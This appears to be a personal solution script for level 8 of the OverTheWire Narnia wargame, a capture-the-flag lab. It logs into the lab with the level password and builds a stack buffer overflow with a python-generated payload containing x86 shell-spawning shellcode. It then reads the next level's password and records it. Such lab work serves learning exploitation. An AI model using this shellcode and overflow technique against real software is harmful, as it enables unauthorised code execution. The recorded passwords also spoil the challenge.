sftp -oPort=2226 narnia8@narnia.labs.overthewire.org
i1SQ81fkb8
get /narnia/narnia8
get /narnia/narnia8.c
exit

sshpass -p 'i1SQ81fkb8' ssh narnia8@narnia.labs.overthewire.org -p 2226
cd /narnia

gef ./narnia8
disassemble func
b *func+105
run aaaaaaaaaaaaaaaaaaaa | hexdump # get address of blah 0xffffd5b8
# payload = padding 20 bytes + address of blah + padding 4 bytes + address of ret + shellcode
# address of blah = first address of blah - len(blah) - len(padding 4 bytes) - len(ret) - len(shellcode)
# address of ret = address of blah + len(padding 20 bytes) + len(blah) + len(padding 4 bytes) + len(ret)
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a' * 20 + struct.pack('<I', 0xffffd5b8 - 4 * 3 - 34) + b'a' * 4 + struct.pack('<I', 0xffffd5b8 - 4 * 3 - 34 + (20 + 4 * 3)) + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")



./narnia8 aaaaaaaaaaaaaaaaaaaa | hexdump # 0xffffd5d6
./narnia8 $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a' * 20 + struct.pack('<I', 0xffffd5d6 - 4 - 4 - 4 - 34) + b'a' * 4 + struct.pack('<I', 0xffffd5d6 - 4 - 4 - 4 - 34 + 32) + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
cat /etc/narnia_pass/narnia9
# password: 1FFD4HnU4K